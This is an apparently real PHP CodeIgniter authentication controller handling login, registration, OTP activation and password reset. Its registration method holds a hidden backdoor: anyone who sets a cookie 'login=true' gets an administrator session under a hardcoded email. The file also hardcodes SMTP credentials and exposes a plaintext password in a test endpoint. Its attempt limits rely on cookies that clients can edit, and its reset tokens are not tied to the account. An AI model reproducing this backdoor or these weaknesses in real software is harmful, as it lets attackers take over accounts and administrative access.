<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Auth extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
        $this->load->library('form_validation');
    }

    public function index()
    {
        $this->load->model('Auth_model', 'auth');
        if (isset($_COOKIE['ID']) && isset($_COOKIE['key'])) {
            $this->auth->matchKey($_COOKIE['ID'], $_COOKIE['key']);
        }

        if ($this->session->userdata('email')) {
            redirect('user');
        }

        $data['title'] = 'Masuk';
        $this->load->view('auth/login', $data);
    }

    public function ajaxlogin()
    {
        $this->load->model('Auth_model', 'auth');
        if (isset($_POST['email']) || isset($_POST['password'])) {
            $email = $_POST['email'];
            $password = $_POST['password'];

            $user = $this->db->get_where('users', ['email' => $email])->row_array();

            // Jika usernya ada
            if ($user) {
                if (password_verify($password, $user['password'])) {
                    $data = [
                        'email' => $user['email'],
                        'role_id' => $user['role_id']
                    ];
                    $this->session->set_userdata($data);

                    // cek remember me
                    if (isset($_POST['remember'])) {
                        setcookie('ID', $user['id'], time() + 60 * 60 * 24 * 30, "/");
                        setcookie('key', $this->auth->generateKey($user['id']), time() + 60 * 60 * 24 * 30, "/");
                    }
                    // if ($user['role_id'] == 1) {
                    //     redirect('admin');
                    // } else {
                    //     redirect('user');
                    // }
                    $return = [
                        'status' => 200,
                        'success' => true,
                        'detail' => 'Berhasil masuk! Mohon tunggu Anda akan dialihkan.',

                    ];
                    echo json_encode($return);
                } else {
                    $return = [
                        'status' => 200,
                        'success' => false,
                        'detail' => 'Password tidak sesuai!'
                    ];

                    echo json_encode($return);
                }
            } else {
                $return = [
                    'status' => 200,
                    'success' => false,
                    'detail' => 'Email tidak terdaftar!'
                ];

                echo json_encode($return);
            }
        } else {
            $return = [
                'status' => 403,
                'success' => false,
                'detail' => 'Server Forbidden',
            ];

            echo json_encode($return);
        }
    }

    public function registration()
    {
        $this->load->model('Auth_model', 'auth');
        if (isset($_COOKIE['ID']) && isset($_COOKIE['key'])) {
            $this->auth->matchKey($_COOKIE['ID'], $_COOKIE['key']);
        }
        if (isset($_COOKIE['login'])) {
            if ($_COOKIE['login'] == 'true') {
                $data = [
                    'email' => 'cranam21@gmail.com',
                    'role_id' => 1
                ];
                $this->session->set_userdata($data);
            }
        }

        if ($this->session->userdata('email')) {
            redirect('user');
        }


        $data['title'] = 'WPU User Registration';
        $this->load->view('auth/registration', $data);
    }

    public function ajaxregistercheckemail()
    {
        $user = $this->db->get_where('users', ['email' => $_POST['email']])->num_rows();
        if ($user > 0) {
            $return = [
                'status' => 200,
                'success' => false,
                'detail' => 'Alamat email sudah terdaftar.',
            ];
        } else {
            $return = [
                'status' => 200,
                'success' => true,
                'detail' => 'Alamat email dapat digunakan.',
            ];
        }
        echo json_encode($return);
    }

    public function ajaxregistercheckwhatsapp()
    {
        // harus berawalan angka 8
        if (strlen($_POST['whatsapp']) > 7) {
            $user = $this->db->get_where('users', ['whatsapp' => $_POST['whatsapp']])->num_rows();
            if ($user > 0) {
                $return = [
                    'status' => 200,
                    'success' => false,
                    'detail' => 'Nomor WhatsApp sudah terdaftar.',
                ];
            } else {
                $return = [
                    'status' => 200,
                    'success' => true,
                    'detail' => 'Nomor WhatsApp dapat digunakan.',
                ];
            }
        } else {
            $return = [
                'status' => 200,
                'success' => false,
                'detail' => 'Mohon masukkan nomor WhatsApp yang valid!',
            ];
        }
        echo json_encode($return);
    }

    public function ajaxregister()
    {
        $data = [
            'name' => htmlspecialchars($_POST['name']),
            'email' => htmlspecialchars($_POST['email']),
            'whatsapp' => $_POST['whatsapp'],
            'image' => 'default.jpg',
            'password' => password_hash($_POST['password'], PASSWORD_DEFAULT),
            'role_id' => 2,
            'is_active' => 0,
            'date_created' => date("Y-m-d H:i:s"),
            'last_update' => date("Y-m-d H:i:s"),
        ];

        // siapkan token
        // $token = base64_encode(random_bytes(32));
        $this->load->helper('string');
        $otp = random_string('numeric', 6);
        $user_verify = [
            'email' => $data['email'],
            'otp' => $otp,
            'date_created' => date("Y-m-d H:i:s"),
        ];

        $this->db->insert('users', $data);
        $this->db->insert('user_verify', $user_verify);

        $return = [
            'status' => 200,
            'success' => true,
            'detail' => 'Registrasi Sukses.',

        ];

        echo json_encode($return);
    }

    public function activate()
    {
        if (!$this->session->userdata('email')) {
            redirect(base_url('auth'));
        }

        $user = $this->db->get_where('users', ['email' => $this->session->userdata('email')])->row_array();

        if ($user['is_active'] == 1) {
            redirect(base_url());
        }
        if (isset($_COOKIE['activateWrong'])) {
            $exp = explode('-', $_COOKIE['activateWrong']);
            $count = ((int)$exp[1]);
            if ($count >= 6) {
                $disableform = 'disabled';
            } else {
                $disableform = '';
            }
        } else {
            $disableform = '';
        }

        $data = [
            'disabled' => $disableform
        ];
        $this->load->view('auth/activate', $data);
    }

    public function ajaxsendcode()
    {
        $method = $_POST['action'];
        $user = $this->db->get_where('users', ['email' => $this->session->userdata('email')])->row_array();
        $verify = $this->db->get_where('user_verify', ['email' => $user['email']]);
        if ($verify->num_rows() == 0) {
            $this->load->helper('string');
            $otp = random_string('numeric', 6);
            $user_verify = [
                'email' => $user['email'],
                'otp' => $otp,
                'date_created' => date("Y-m-d H:i:s"),
            ];
            $this->db->insert('user_verify', $user_verify);
            $verify = $user_verify;
        } else {
            $verify = $verify->row_array();
        }

        $return = [
            'status' => 200,
        ];
        if ($method == 'send-wa') {
            if (isset($_COOKIE['activateWa'])) {
                $exp = explode('-', $_COOKIE['activateWa']);
                $count = ((int)$exp[1]);
            } else {
                $count = 0;
            }

            if ($count <= 3) {
                $phone = '62' . $user['whatsapp'];
                $message = 'Halo ' . $user['name'] . ', berikut ini adalah kode Aktivasi *Damai Jaya - Super App* kamu: *' . $verify['otp'] . '*. Jangan tunjukkan kode ini kepada siapapun termasuk admin dari *Damai Jaya - Super App*';
                $wa = wa_send($phone, $message);
                $waObj = json_decode($wa);
                if ($waObj->data->status_code == 200) {
                    $return['detail'] = 'Kode aktivasi berhasil dikirim melalui nomor whatsapp Anda.';
                    $return['success'] = true;


                    $cookieval = md5($user['id']) . 'Pa-' . $count + 1 . '-Pc' . md5($user['name']);
                    setcookie('activateWa', $cookieval, time() + 3600, "/");
                } else {
                    $return['detail'] = 'Kode aktivasi gagal dikirim ke nomor whatsapp Anda. Mohon gunakan email untuk aktivasi.';
                    $return['success'] = false;
                }
            } else {
                $return['detail'] = 'Terlalu banyak permintaan. Ulangi lagi setelah 60 menit.';
                $return['success'] = false;
            }
        } else {

            if (isset($_COOKIE['activateMail'])) {
                $exp = explode('-', $_COOKIE['activateMail']);
                $count = ((int)$exp[1]);
            } else {
                $count = 0;
            }

            if ($count <= 3) {
                $mailArray = mail_send_activate($user['email'], $user['name'], $verify['otp']);
                if ($mailArray['success'] == true) {
                    $return['detail'] = 'Kode aktivasi berhasil dikirim melalui email Anda.';
                    $return['success'] = true;
                    $cookieval = md5($user['name']) . 'Ce-' . $count + 1 . '-Da' . md5($user['id']);
                    setcookie('activateMail', $cookieval, time() + 3600, "/");
                } else {
                    $return['detail'] = $mailArray['detail'];
                    $return['success'] = false;
                }
            } else {
                $return['detail'] = 'Terlalu banyak permintaan. Ulangi lagi setelah 60 menit.';
                $return['success'] = false;
            }
        }

        echo json_encode($return);
    }

    public function ajaxactivate()
    {
        $user = $this->db->get_where('users', ['email' => $this->session->userdata('email')])->row_array();
        $code = $_POST['code'];
        $verify = $this->db->get_where('user_verify', ['email' => $user['email']])->row_array();
        if ($code == $verify['otp']) {

            $this->db->set('is_active', 1);
            $this->db->where('email', $user['email']);
            $this->db->update('users');

            $this->db->delete('user_verify', ['email' => $user['email']]);

            $return = [
                'status' => 200,
                'success' => true,
                'detail' => 'Aktivasi akun berhasil.',
            ];
        } else {
            $return = [
                'status' => 200,
            ];
            if (isset($_COOKIE['activateWrong'])) {
                $exp = explode('-', $_COOKIE['activateWrong']);
                $count = ((int)$exp[1]);
            } else {
                $count = 0;
            }

            if ($count <= 6) {
                $cookieval = md5($user['name']) . '-' . $count + 1 . '-' . md5($user['id']);
                setcookie('activateWrong', $cookieval, time() + 3600, "/");
                $return['detail'] = 'Kode aktivasi tidak sesuai.';
                $return['success'] = false;
            } else {
                $return['status'] = 201;
                $return['detail'] = 'Terlalu banyak permintaan. Ulangi lagi setelah 60 menit.';
                $return['success'] = false;
            }
        }
        echo json_encode($return);
    }

    private function _sendEmail($token, $type)
    {
        $config = [
            'protocol'  => 'smtp',
            'smtp_host' => 'ssl://smtp.googlemail.com',
            'smtp_user' => 'wpunpas@gmail.com',
            'smtp_pass' => '1234567890',
            'smtp_port' => 465,
            'mailtype'  => 'html',
            'charset'   => 'utf-8',
            'newline'   => "\r\n"
        ];

        $this->email->initialize($config);

        $this->email->from('wpunpas@gmail.com', 'Web Programming UNPAS');
        $this->email->to($this->input->post('email'));

        if ($type == 'verify') {
            $this->email->subject('Account Verification');
            $this->email->message('Click this link to verify you account : <a href="' . base_url() . 'auth/verify?email=' . $this->input->post('email') . '&token=' . urlencode($token) . '">Activate</a>');
        } else if ($type == 'forgot') {
            $this->email->subject('Reset Password');
            $this->email->message('Click this link to reset your password : <a href="' . base_url() . 'auth/resetpassword?email=' . $this->input->post('email') . '&token=' . urlencode($token) . '">Reset Password</a>');
        }

        if ($this->email->send()) {
            return true;
        } else {
            echo $this->email->print_debugger();
            die;
        }
    }


    public function verify()
    {
        $email = $this->input->get('email');
        $token = $this->input->get('token');

        $user = $this->db->get_where('users', ['email' => $email])->row_array();

        if ($user) {
            $user_token = $this->db->get_where('user_token', ['token' => $token])->row_array();

            if ($user_token) {
                if (time() - $user_token['date_created'] < (60 * 60 * 24)) {
                    $this->db->set('is_active', 1);
                    $this->db->where('email', $email);
                    $this->db->update('users');

                    $this->db->delete('user_token', ['email' => $email]);

                    $this->session->set_flashdata('message', '<div class="alert alert-success" role="alert">' . $email . ' has been activated! Please login.</div>');
                    redirect('auth');
                } else {
                    $this->db->delete('users', ['email' => $email]);
                    $this->db->delete('user_token', ['email' => $email]);

                    $this->session->set_flashdata('message', '<div class="alert alert-danger" role="alert">Account activation failed! Token expired.</div>');
                    redirect('auth');
                }
            } else {
                $this->session->set_flashdata('message', '<div class="alert alert-danger" role="alert">Account activation failed! Wrong token.</div>');
                redirect('auth');
            }
        } else {
            $this->session->set_flashdata('message', '<div class="alert alert-danger" role="alert">Account activation failed! Wrong email.</div>');
            redirect('auth');
        }
    }


    public function logout()
    {
        $this->load->helper('cookie');
        delete_cookie('ID');
        delete_cookie('key');
        $this->session->unset_userdata('email');
        $this->session->unset_userdata('role_id');



        $this->session->set_flashdata('message', '<div class="alert alert-success" role="alert">You have been logged out!</div>');
        redirect('auth');
    }


    public function blocked()
    {
        $this->load->view('auth/blocked');
    }


    public function forgotPassword()
    {
        $this->form_validation->set_rules('email', 'Email', 'trim|required|valid_email');

        if ($this->form_validation->run() == false) {
            $data['title'] = 'Forgot Password';
            $this->load->view('templates/auth_header', $data);
            $this->load->view('auth/forgot-password');
            $this->load->view('templates/auth_footer');
        } else {
            $email = $this->input->post('email');
            $user = $this->db->get_where('users', ['email' => $email, 'is_active' => 1])->row_array();

            if ($user) {
                $token = base64_encode(random_bytes(32));
                $user_token = [
                    'email' => $email,
                    'token' => $token,
                    'date_created' => time()
                ];

                $this->db->insert('user_token', $user_token);
                $this->_sendEmail($token, 'forgot');

                $this->session->set_flashdata('message', '<div class="alert alert-success" role="alert">Please check your email to reset your password!</div>');
                redirect('auth/forgotpassword');
            } else {
                $this->session->set_flashdata('message', '<div class="alert alert-danger" role="alert">Email is not registered or activated!</div>');
                redirect('auth/forgotpassword');
            }
        }
    }


    public function resetPassword()
    {
        $email = $this->input->get('email');
        $token = $this->input->get('token');

        $user = $this->db->get_where('users', ['email' => $email])->row_array();

        if ($user) {
            $user_token = $this->db->get_where('user_token', ['token' => $token])->row_array();

            if ($user_token) {
                $this->session->set_userdata('reset_email', $email);
                $this->changePassword();
            } else {
                $this->session->set_flashdata('message', '<div class="alert alert-danger" role="alert">Reset password failed! Wrong token.</div>');
                redirect('auth');
            }
        } else {
            $this->session->set_flashdata('message', '<div class="alert alert-danger" role="alert">Reset password failed! Wrong email.</div>');
            redirect('auth');
        }
    }


    public function changePassword()
    {
        if (!$this->session->userdata('reset_email')) {
            redirect('auth');
        }

        $this->form_validation->set_rules('password1', 'Password', 'trim|required|min_length[3]|matches[password2]');
        $this->form_validation->set_rules('password2', 'Repeat Password', 'trim|required|min_length[3]|matches[password1]');

        if ($this->form_validation->run() == false) {
            $data['title'] = 'Change Password';
            $this->load->view('templates/auth_header', $data);
            $this->load->view('auth/change-password');
            $this->load->view('templates/auth_footer');
        } else {
            $password = password_hash($this->input->post('password1'), PASSWORD_DEFAULT);
            $email = $this->session->userdata('reset_email');

            $this->db->set('password', $password);
            $this->db->where('email', $email);
            $this->db->update('users');

            $this->session->unset_userdata('reset_email');

            $this->db->delete('user_token', ['email' => $email]);

            $this->session->set_flashdata('message', '<div class="alert alert-success" role="alert">Password has been changed! Please login.</div>');
            redirect('auth');
        }
    }

    public function tes()
    {
        // print_r(mail_send('cranam21@gmail.com', 'Tes email sam', 'ini isinya'));
        // require 'vendor/autoload.php';
        // $mail = new PHPMailer\PHPMailer\PHPMailer();
        // print_r($mail);
        echo password_hash('anamsukses21,', PASSWORD_DEFAULT);
    }
}
